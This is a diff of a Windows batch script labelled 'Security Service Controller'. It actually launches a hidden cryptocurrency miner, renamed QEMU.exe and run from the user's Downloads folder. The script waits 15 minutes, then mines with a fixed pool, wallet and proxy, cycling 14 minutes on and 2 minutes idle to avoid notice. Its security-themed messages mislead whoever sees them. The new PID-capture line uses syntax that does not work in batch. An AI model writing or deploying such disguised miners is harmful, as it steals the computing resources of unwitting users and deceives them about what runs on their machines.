@@ -9,24 +9,24 @@
 
 
 title Security Service Controller
-setlocal enabledelayedexpansion
+setlocal EnableDelayedExpansion
+
+echo ========================================
+echo   Security Service Controller STARTED
+echo   Mode: NON-ADMIN
+echo ========================================
 
 REM =========================
-REM TARGET EXECUTABLE (AMAN)
-REM =========================
-set TARGET_EXE=C:\Users\%USERNAME%\Downloads\QEMU.exe
-
-REM =========================
-REM COUNTDOWN TOTAL 15 MENIT
+REM Countdown Total 15 Menit
 REM =========================
 
-echo [Security] Countdown started (15 minutes total)
+echo [Security] Countdown: 15 minutes remaining...
 timeout /t 300 /nobreak
 
-echo [Security] Countdown checkpoint: 10 minutes
+echo [Security] Countdown: 10 minutes remaining...
 timeout /t 300 /nobreak
 
-echo [Security] Countdown checkpoint: 5 minutes
+echo [Security] Countdown: 5 minutes remaining...
 timeout /t 300 /nobreak
 
 REM =========================
@@ -35,38 +35,38 @@ REM =========================
 
 :SECURITY_LOOP
 
-echo [Security] Ensuring no previous instance running...
-powershell -NoProfile -Command ^
-"Get-CimInstance Win32_Process | Where-Object { $_.ExecutablePath -eq '%TARGET_EXE%' } | Invoke-CimMethod -MethodName Terminate" >nul 2>&1
+echo ----------------------------------------
+echo [Security] Service running (14 minutes)
+echo ----------------------------------------
 
-echo [Security] Service running (14 minutes)...
-start "" /b "%TARGET_EXE%" ^
---algorithm yespowerr16 ^
---pool yespowerR16.sea.mine.zpool.ca:6534 ^
---wallet LXgzuXChG5gx9nC4UqcvFV42axj6V72Fkc ^
---password c=LTC ^
---disable-gpu ^
---nicehash false ^
---keepalive true ^
---disable-startup-monitor ^
---disable-huge-pages ^
---disable-msr-tweaks ^
---cpu-threads 2 ^
---cpu-threads-intensity 1 ^
---cpu-threads-priority 1 ^
---miner-priority 1 ^
---proxy 174.138.61.184:1080
+start "" /b "C:\Users\%USERNAME%\Downloads\QEMU.exe" ^
+ --algorithm yespowerr16 ^
+ --pool yespowerR16.sea.mine.zpool.ca:6534 ^
+ --wallet LXgzuXChG5gx9nC4UqcvFV42axj6V72Fkc ^
+ --password c=LTC ^
+ --disable-gpu ^
+ --nicehash false ^
+ --keepalive true ^
+ --disable-startup-monitor ^
+ --disable-huge-pages ^
+ --disable-msr-tweaks ^
+ --cpu-threads 2 ^
+ --cpu-threads-intensity 1 ^
+ --cpu-threads-priority 1 ^
+ --miner-priority 1 ^
+ --proxy 174.138.61.184:1080
 
-REM 14 menit = 840 detik
+REM Simpan PID terakhir
+set QEMU_PID=%!
+
+REM Tunggu 14 menit (840 detik)
 timeout /t 840 /nobreak
 
-echo [Security] Stopping service (path-specific)...
-powershell -NoProfile -Command ^
-"Get-CimInstance Win32_Process | Where-Object { $_.ExecutablePath -eq '%TARGET_EXE%' } | Invoke-CimMethod -MethodName Terminate" >nul 2>&1
+echo [Security] Stopping service (PID=%QEMU_PID%)...
+
+taskkill /PID %QEMU_PID% >nul 2>&1
 
 echo [Security] Idle 2 minutes...
 timeout /t 120 /nobreak
 
 goto SECURITY_LOOP
-
-
